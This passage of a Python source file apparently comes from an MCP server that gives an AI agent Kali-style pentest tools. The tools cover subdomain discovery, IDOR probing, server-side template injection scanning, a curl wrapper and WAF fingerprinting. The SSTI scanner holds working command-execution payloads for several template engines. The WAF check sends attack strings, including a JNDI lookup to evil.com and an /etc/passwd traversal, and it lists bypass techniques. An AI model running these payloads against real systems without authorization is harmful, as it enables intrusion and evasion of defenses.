               "git", "ci", "monitor", "db", "redis", "elastic", "auth", "sso", "login",
               "webmail", "remote", "cloud", "beta", "demo", "sandbox", "backup", "old"]

    found = []
    for prefix in prefixes:
        sub = f"{prefix}.{target}"
        try:
            ip = socket.gethostbyname(sub)
            found.append({"subdomain": sub, "ip": ip})
        except socket.gaierror:
            pass

    progress.update("HTTP probing")
    live_subs = []
    for sub_info in found:
        for scheme in ["https", "http"]:
            url = f"{scheme}://{sub_info['subdomain']}"
            cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
                   "-w", "%{http_code}|%{redirect_url}", url]
            r = run_command_advanced(cmd, timeout=8, trace=trace)
            parts = r["stdout"].split("|")
            status = int(parts[0]) if parts and parts[0].isdigit() else 0
            if status > 0 and status != 000:
                sub_info["http_status"] = status
                sub_info["url"] = url
                sub_info["redirect"] = parts[1] if len(parts) > 1 else ""
                live_subs.append(sub_info.copy())
                break

    progress.update("Certificate check")
    crt_cmd = ["curl", "-s", "--max-time", "15", f"https://crt.sh/?q=%25.{target}&output=json"]
    crt_result = run_command_advanced(crt_cmd, timeout=20, trace=trace)
    crt_subs = set()
    try:
        for entry in json.loads(crt_result["stdout"]):
            for name in entry.get("name_value", "").split("\n"):
                name = name.strip().lower()
                if name.endswith(f".{target}"):
                    crt_subs.add(name)
    except Exception:
        pass

    progress.update("Analysis")
    output = {
        "status": "success", "target": target,
        "dns_found": len(found), "live_subdomains": len(live_subs),
        "certificate_subdomains": len(crt_subs),
        "resolved_subdomains": found,
        "live_http_subdomains": live_subs,
        "crt_sh_subdomains": sorted(crt_subs)[:100]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("subdomain_scanner", target, output)
    log_tool_execution("subdomain_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def idor_tester(
    target: str,
    param: str = "id",
    start_id: int = 1,
    end_id: int = 20,
    method: str = "GET",
    auth_header: str = "",
    timeout: int = 60
) -> str:
    """
    IDOR (Insecure Direct Object Reference) tester. Iterates through object IDs to detect unauthorized access.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("idor_tester", target, 5)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "param": param, "range": f"{start_id}-{end_id}"}

    progress.update("Testing IDOR")
    results = []
    baseline_sizes = set()

    for i in range(start_id, min(end_id + 1, start_id + 50)):
        if "{" + param + "}" in url:
            test_url = url.replace("{" + param + "}", str(i))
        elif f"{param}=" in url:
            test_url = re.sub(f"{param}=\\d+", f"{param}={i}", url)
        else:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={i}"

        cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}", test_url]
        if auth_header:
            cmd.extend(["-H", auth_header])
        r = run_command_advanced(cmd, timeout=12, trace=trace)

        lines = r["stdout"].rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else ""
        meta = lines[-1] if lines else "0|0"
        parts = meta.split("|")
        status = int(parts[0]) if parts and parts[0].isdigit() else 0
        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0

        entry = {"id": i, "url": test_url, "status": status, "size": size}
        if status == 200 and size > 0:
            entry["accessible"] = True
            entry["body_preview"] = body[:300]
            baseline_sizes.add(size)
        else:
            entry["accessible"] = False
        results.append(entry)

    progress.update("Analyzing patterns")
    accessible = [r for r in results if r.get("accessible")]
    unique_sizes = len(set(r["size"] for r in accessible))
    possibly_vulnerable = len(accessible) > 1 and unique_sizes > 1

    progress.update("Analysis")
    output = {
        "status": "success", "target": url, "parameter": param,
        "tested_range": f"{start_id}-{min(end_id, start_id + 49)}",
        "accessible_count": len(accessible),
        "total_tested": len(results),
        "unique_response_sizes": unique_sizes,
        "possibly_vulnerable": possibly_vulnerable,
        "accessible_objects": accessible[:20],
        "all_results": results[:30],
        "severity": "HIGH" if possibly_vulnerable else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("idor_tester", target, output)
    log_tool_execution("idor_tester", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def ssti_scanner(
    target: str,
    param: str = "name",
    method: str = "GET",
    data: str = "",
    timeout: int = 60
) -> str:
    """
    SSTI (Server-Side Template Injection) scanner. Tests for Jinja2, Twig, Freemarker, Mako, Pebble, and other template engines.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("ssti_scanner", target, 5)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "param": param, "method": method}

    progress.update("Preparing SSTI payloads")
    payloads = [
        {"engine": "generic", "payload": "{{7*7}}", "expected": "49"},
        {"engine": "generic", "payload": "${7*7}", "expected": "49"},
        {"engine": "generic", "payload": "#{7*7}", "expected": "49"},
        {"engine": "jinja2", "payload": "{{config}}", "expected": "SECRET_KEY"},
        {"engine": "jinja2", "payload": "{{self.__class__.__mro__}}", "expected": "type"},
        {"engine": "jinja2", "payload": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('7*7') }}{% endif %}{% endfor %}", "expected": "49"},
        {"engine": "twig", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "expected": ""},
        {"engine": "freemarker", "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "expected": "uid="},
        {"engine": "mako", "payload": "${self.module.cache.util.os.popen('id').read()}", "expected": "uid="},
        {"engine": "erb", "payload": "<%= 7*7 %>", "expected": "49"},
        {"engine": "pebble", "payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}", "expected": "uid="},
        {"engine": "smarty", "payload": "{php}echo 7*7;{/php}", "expected": "49"},
        {"engine": "velocity", "payload": "#set($x=7*7)${x}", "expected": "49"},
    ]

    progress.update("Testing payloads")
    results = []
    for p in payloads:
        encoded = urllib.parse.quote(p["payload"])
        if method == "GET":
            test_url = f"{url}?{param}={encoded}" if "?" not in url else f"{url}&{param}={encoded}"
            cmd = ["curl", "-sk", "--max-time", "10", test_url]
        else:
            post_data = f"{param}={encoded}"
            if data:
                post_data = f"{data}&{post_data}"
            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST", "-d", post_data, url]

        r = run_command_advanced(cmd, timeout=15, trace=trace)
        found = p["expected"] and p["expected"] in r["stdout"]
        results.append({
            "engine": p["engine"], "payload": p["payload"],
            "expected": p["expected"], "found": found,
            "response_preview": r["stdout"][:300] if found else "",
            "response_length": len(r["stdout"])
        })

    progress.update("Analysis")
    vulns = [r for r in results if r["found"]]
    detected_engines = list(set(r["engine"] for r in vulns))

    output = {
        "status": "success", "target": url, "parameter": param,
        "payloads_tested": len(payloads), "vulnerabilities_found": len(vulns),
        "detected_engines": detected_engines,
        "vulnerable_payloads": vulns,
        "all_results": results,
        "severity": "CRITICAL" if vulns else "info",
        "recommendations": [
            "Use auto-escaping in templates",
            "Sanitize user input before template rendering",
            "Use sandboxed template environments",
            "Avoid passing raw user input to template engines"
        ] if vulns else ["No SSTI detected"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("ssti_scanner", target, output)
    log_tool_execution("ssti_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def run_curl_advanced(
    url: str,
    method: str = "GET",
    headers: str = "",
    data: str = "",
    follow_redirects: bool = True,
    include_headers: bool = True,
    proxy: str = "",
    cookies: str = "",
    auth: str = "",
    timeout: int = 30
) -> str:
    """
    Advanced curl wrapper with full control over HTTP requests. Supports custom headers, auth, proxies, cookies.
    """
    target = url.replace("http://", "").replace("https://", "").split("/")[0]
    trace, progress, exec_dir = _init_tool_context("run_curl_advanced", target, 4)
    inputs = {"url": url, "method": method, "has_data": bool(data)}

    progress.update("Building request")
    cmd = ["curl", "-sk", "--max-time", str(timeout)]
    if method != "GET":
        cmd.extend(["-X", method])
    if include_headers:
        cmd.append("-i")
    if follow_redirects:
        cmd.extend(["-L", "--max-redirs", "10"])
    if headers:
        for h in headers.split(";"):
            if h.strip():
                cmd.extend(["-H", h.strip()])
    if data:
        cmd.extend(["-d", data])
    if proxy:
        cmd.extend(["-x", proxy])
    if cookies:
        cmd.extend(["-b", cookies])
    if auth:
        cmd.extend(["-u", auth])
    cmd.append(url)

    progress.update("Executing request")
    trace.command(f"curl {method} {url}")
    result = run_command_advanced(cmd, timeout=timeout + 10, trace=trace)

    progress.update("Parsing response")
    response_headers = {}
    body = result["stdout"]
    if include_headers and "\r\n\r\n" in body:
        header_section, body = body.split("\r\n\r\n", 1)
        for line in header_section.split("\r\n"):
            if ":" in line:
                k, _, v = line.partition(":")
                response_headers[k.strip()] = v.strip()

    output = {
        "status": "success", "url": url, "method": method,
        "response_headers": response_headers,
        "body": body[:5000],
        "body_length": len(body),
        "return_code": result["return_code"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("run_curl_advanced", target, output)
    log_tool_execution("run_curl_advanced", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def waf_fingerprint(
    target: str,
    timeout: int = 60
) -> str:
    """
    WAF (Web Application Firewall) detection and fingerprinting. Identifies Cloudflare, AWS WAF, Akamai, ModSecurity, etc.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("waf_fingerprint", target, 5)
    url = target if target.startswith("http") else f"https://{target}"
    inputs = {"target": url}

    progress.update("Baseline request")
    baseline_cmd = ["curl", "-sI", "-k", "--max-time", "10", url]
    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
    baseline_headers = baseline["stdout"].lower()

    waf_signatures = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai": ["akamai", "x-akamai", "akamai-ghost"],
        "Imperva/Incapsula": ["incap_ses", "incapsula", "x-iinfo", "visid_incap"],
        "F5 BIG-IP": ["bigipserver", "f5", "x-wa-info"],
        "ModSecurity": ["mod_security", "modsecurity", "nyob"],
        "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
        "Barracuda": ["barra_counter_session", "barracuda"],
        "Fortinet/FortiWeb": ["fortigate", "fortiweb", "fortiwafd"],
        "DDoS-Guard": ["ddos-guard"],
        "StackPath": ["stackpath"],
        "Varnish": ["x-varnish", "via: varnish"],
        "Nginx": ["nginx"],
        "Apache": ["apache"]
    }

    detected_wafs = []
    for waf, sigs in waf_signatures.items():
        for sig in sigs:
            if sig.lower() in baseline_headers:
                detected_wafs.append({"name": waf, "indicator": sig, "source": "headers"})
                break

    progress.update("Trigger WAF with malicious payload")
    trigger_payloads = [
        "<script>alert('XSS')</script>",
        "' OR 1=1 --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
    ]
    trigger_results = []
    for payload in trigger_payloads:
        encoded = urllib.parse.quote(payload)
        trigger_url = f"{url}?test={encoded}"
        trigger_cmd = ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
                      "-w", "%{http_code}", trigger_url]
        r = run_command_advanced(trigger_cmd, timeout=15, trace=trace)
        status = int(r["stdout"]) if r["stdout"].isdigit() else 0
        blocked = status in [403, 406, 429, 503]
        trigger_results.append({"payload": payload, "status": status, "blocked": blocked})
        if blocked and not any(w["source"] == "blocking" for w in detected_wafs):
            detected_wafs.append({"name": "Unknown WAF", "indicator": f"Blocked payload (HTTP {status})",
                                "source": "blocking"})

    progress.update("wafw00f check")
    wafw00f_cmd = ["wafw00f", url]
    wafw00f_result = run_command_advanced(wafw00f_cmd, timeout=30, trace=trace)

    progress.update("Analysis")
    output = {
        "status": "success", "target": url,
        "waf_detected": bool(detected_wafs),
        "wafs": detected_wafs,
        "trigger_tests": trigger_results,
        "wafw00f_output": wafw00f_result["stdout"][:1500],
        "bypass_recommendations": [
            "Try different encoding (URL, double-URL, Unicode)",
            "Use HTTP parameter pollution",
            "Try alternate HTTP methods",
            "Modify Content-Type header",
            "Use chunked transfer encoding",
            "Insert null bytes or comments in payloads"
        ] if detected_wafs else [],
        "severity": "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("waf_fingerprint", target, output)
    log_tool_execution("waf_fingerprint", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# SERVER SECURITY AUDIT (SELF-AUDIT)
# ============================================================================

@mcp.tool()
@resolve_references
async def server_security_audit() -> str:
    """
    Security audit of this MCP server itself. Checks file permissions, input validation, dependency vulnerabilities,
    configuration security, and provides hardening recommendations.
    """
    target = "mcp_server_self"
    trace, progress, exec_dir = _init_tool_context("server_security_audit", target, 7)
    inputs = {"audit_type": "self"}

    findings = []

    progress.update("Checking file permissions")
    server_file = os.path.abspath(__file__)
    stat = os.stat(server_file)
    perms = oct(stat.st_mode)[-3:]
    if perms != "644" and perms != "600":
        findings.append({"category": "file_permissions", "severity": "MEDIUM",
                        "detail": f"Server file permissions: {perms} (recommended: 644)",
                        "file": server_file})

    for d in [SESSIONS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
        if os.path.exists(d):
            d_perms = oct(os.stat(d).st_mode)[-3:]
            if d_perms not in ["755", "700"]:
                findings.append({"category": "directory_permissions", "severity": "LOW",
                                "detail": f"Directory {d} permissions: {d_perms}"})

    progress.update("Checking input validation")
    validation_checks = {
        "InputValidator class": "InputValidator" in open(server_file).read(),
        "sanitize_target": "sanitize_target" in open(server_file).read(),
        "validate_command_args": "validate_command_args" in open(server_file).read(),
        "validate_file_path": "validate_file_path" in open(server_file).read()
    }
    for check, present in validation_checks.items():
        if not present:
            findings.append({"category": "input_validation", "severity": "HIGH",
                            "detail": f"Missing: {check}"})

    progress.update("Checking for hardcoded secrets")
    with open(server_file) as f:
        content = f.read()
    secret_patterns = [
        (r'(?:password|secret|key|token)\s*=\s*["\'][^"\']{8,}["\']', "Potential hardcoded secret"),
        (r'(?:api[_-]?key)\s*[:=]\s*["\'][^"\']+["\']', "Potential API key"),
    ]
    for pattern, desc in secret_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            findings.append({"category": "hardcoded_secrets", "severity": "HIGH",
                            "detail": desc, "count": len(matches)})

    progress.update("Checking dependency security")
    pip_audit = run_command_advanced(["pip", "list", "--outdated", "--format=json"], timeout=30, trace=trace)
    try:
        outdated = json.loads(pip_audit["stdout"])
        if outdated:
            findings.append({"category": "outdated_dependencies", "severity": "LOW",
                            "detail": f"{len(outdated)} outdated packages",
                            "packages": [f"{p['name']}:{p['version']}->{p['latest_version']}" for p in outdated[:10]]})
    except Exception:
        pass

    progress.update("Checking logging security")
    if "trace.jsonl" in content:
        findings.append({"category": "logging", "severity": "info",
                        "detail": "Forensic JSONL trace logging is enabled"})
    if SESSIONS_DIR and os.path.exists(SESSIONS_DIR):
        session_count = len(os.listdir(SESSIONS_DIR))
        if session_count > 100:
            findings.append({"category": "log_retention", "severity": "LOW",
                            "detail": f"{session_count} sessions stored - consider rotation"})

    progress.update("Architecture security score")
    security_features = {
        "InputValidator": "InputValidator" in content,
        "TraceLogger": "TraceLogger" in content,
        "SessionManager": "SessionManager" in content,
        "ToolChainEngine": "ToolChainEngine" in content,
        "CVECartographer": "CVECartographer" in content,
        "hierarchical_logging": "sessions/" in content,
        "progress_reporting": "ProgressReporter" in content,
        "command_sanitization": "shlex" in content,
        "timeout_enforcement": "timeout" in content,
        "error_handling": "try:" in content and "except" in content
    }
    score = sum(1 for v in security_features.values() if v)
    total = len(security_features)

    output = {
        "status": "success",
        "findings": findings,
        "finding_count": len(findings),
        "security_features": security_features,
        "security_score": f"{score}/{total}",
        "grade": "A" if score >= total * 0.9 else "B" if score >= total * 0.7 else "C",
        "recommendations": [
            "Rotate session logs after 30 days",
            "Add rate limiting per client",
            "Implement tool execution quotas",
            "Add RBAC (Role-Based Access Control) for sensitive tools",
            "Enable TLS for MCP transport",
            "Add integrity checks for tool chain data"
        ],
        "severity": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "info"
    }

    progress.update("Complete")
    log_tool_execution("server_security_audit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Start the Kali MCP Server v4."""
    import sys
    logger.info("=" * 60)
    logger.info("Kali MCP Server v4 - Professional Pentest & Bug Bounty Platform")
    logger.info("=" * 60)
    logger.info(f"Sessions directory: {SESSIONS_DIR}")
    logger.info(f"Chain directory: {CHAIN_DIR}")
    logger.info(f"CVE cache: {CVE_CACHE_DIR}")

    # Count registered tools
    tool_count = len([attr for attr in dir(mcp) if not attr.startswith('_')])
    logger.info(f"Architecture: v4 (trace + progress + chain + CVE cartography)")
    logger.info(f"Starting MCP server on stdio transport...")

    mcp.run(transport="stdio")


if __name__ == "__main__":
    main()
